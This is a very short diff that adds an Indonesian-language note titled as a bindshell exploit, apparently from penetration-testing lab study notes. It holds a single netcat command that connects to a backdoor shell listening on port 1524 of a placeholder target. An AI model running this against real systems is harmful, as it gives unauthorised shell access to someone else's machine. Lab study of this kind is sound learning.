@@ -1,0 +1,9 @@
+### exploit bindshell,bindshell ini berjalan pada port 1524
+
+# kita akan menggunakan netcat
+
+$ netcat <ip target> 1524
+
+
+
+
